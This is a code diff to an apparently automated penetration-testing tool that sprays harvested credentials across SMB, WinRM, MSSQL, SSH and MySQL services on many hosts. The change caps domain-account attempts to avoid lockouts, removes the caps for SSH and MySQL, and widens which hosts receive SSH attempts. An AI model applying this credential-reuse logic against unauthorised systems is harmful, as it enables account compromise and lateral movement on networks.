@@ -297,9 +297,13 @@ def run() -> list[dict]:
 
     print(f"[reuse] Loaded {len(credentials)} unique credential(s), {len(hosts)} host(s).")
 
-    # Per-credential attempt counter  key: (username.lower(), password, domain.lower())
-    attempt_count: dict[tuple, int] = {}
-    MAX_ATTEMPTS = 3
+    # Per-credential attempt counter for domain services (SMB/WinRM/MSSQL).
+    # Limits AD account lockout risk: max 3 attempts per domain credential
+    # across all Windows targets combined.
+    # SSH attempts are counted per-host (not globally) since local accounts
+    # don't have AD-style lockout policies.
+    domain_attempt_count: dict[tuple, int] = {}
+    MAX_DOMAIN_ATTEMPTS = 3
 
     reuse_events: list[dict] = []
 
@@ -325,8 +329,8 @@ def run() -> list[dict]:
             if is_domain and _is_windows(host_entry):
 
                 if _port_open(host_entry, PORT_SMB):
-                    if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
-                        attempt_count[cred_key] = attempt_count.get(cred_key, 0) + 1
+                    if domain_attempt_count.get(cred_key, 0) < MAX_DOMAIN_ATTEMPTS:
+                        domain_attempt_count[cred_key] = domain_attempt_count.get(cred_key, 0) + 1
                         print(f"[reuse] Testing {display}:{password} against {target_ip} SMB...")
                         ok, evidence = _try_smb(target_ip, username, password, domain)
                         reuse_events.append({
@@ -341,8 +345,8 @@ def run() -> list[dict]:
                             print(f"[reuse]   SUCCESS: {evidence}")
 
                 if _port_open(host_entry, PORT_WINRM):
-                    if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
-                        attempt_count[cred_key] = attempt_count.get(cred_key, 0) + 1
+                    if domain_attempt_count.get(cred_key, 0) < MAX_DOMAIN_ATTEMPTS:
+                        domain_attempt_count[cred_key] = domain_attempt_count.get(cred_key, 0) + 1
                         print(f"[reuse] Testing {display}:{password} against {target_ip} WinRM...")
                         ok, evidence = _try_winrm(target_ip, username, password, domain)
                         reuse_events.append({
@@ -357,8 +361,8 @@ def run() -> list[dict]:
                             print(f"[reuse]   SUCCESS: {evidence}")
 
                 if _port_open(host_entry, PORT_MSSQL):
-                    if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
-                        attempt_count[cred_key] = attempt_count.get(cred_key, 0) + 1
+                    if domain_attempt_count.get(cred_key, 0) < MAX_DOMAIN_ATTEMPTS:
+                        domain_attempt_count[cred_key] = domain_attempt_count.get(cred_key, 0) + 1
                         print(f"[reuse] Testing {display}:{password} against {target_ip} MSSQL...")
                         ok, evidence = _try_mssql(target_ip, username, password, domain)
                         reuse_events.append({
@@ -372,29 +376,26 @@ def run() -> list[dict]:
                         if ok:
                             print(f"[reuse]   SUCCESS: {evidence}")
 
-            # ---- Local (non-domain) credentials -> SSH (Linux targets) ----
-            elif not is_domain and _is_linux(host_entry):
-
-                if _port_open(host_entry, PORT_SSH):
-                    if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
-                        attempt_count[cred_key] = attempt_count.get(cred_key, 0) + 1
-                        print(f"[reuse] Testing {username}:{password} against {target_ip} SSH...")
-                        ok, evidence = _try_ssh(target_ip, username, password)
-                        reuse_events.append({
-                            "credential":  {"username": username, "password": password},
-                            "source_host": source_host,
-                            "target_host": target_ip,
-                            "service":     "ssh",
-                            "success":     ok,
-                            "evidence":    evidence,
-                        })
-                        if ok:
-                            print(f"[reuse]   SUCCESS: {evidence}")
+            # ---- Local (non-domain) credentials -> SSH on any host with port 22 ----
+            # Gate on port open only — os_guess may be empty if the host didn't
+            # respond to OS detection, so _is_linux() would give a false negative.
+            if not is_domain and _port_open(host_entry, PORT_SSH):
+                print(f"[reuse] Testing {username}:{password} against {target_ip} SSH...")
+                ok, evidence = _try_ssh(target_ip, username, password)
+                reuse_events.append({
+                    "credential":  {"username": username, "password": password},
+                    "source_host": source_host,
+                    "target_host": target_ip,
+                    "service":     "ssh",
+                    "success":     ok,
+                    "evidence":    evidence,
+                })
+                if ok:
+                    print(f"[reuse]   SUCCESS: {evidence}")
 
             # ---- Database credentials -> MySQL (database hosts) ----
             if _is_database_host(host_entry) and _port_open(host_entry, PORT_MYSQL):
-                if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
-                    attempt_count[cred_key] = attempt_count.get(cred_key, 0) + 1
+                if True:  # No lockout risk for MySQL; always attempt
                     print(f"[reuse] Testing {username}:{password} against {target_ip} MySQL...")
                     ok, evidence = _try_mysql(target_ip, username, password)
                     reuse_events.append({
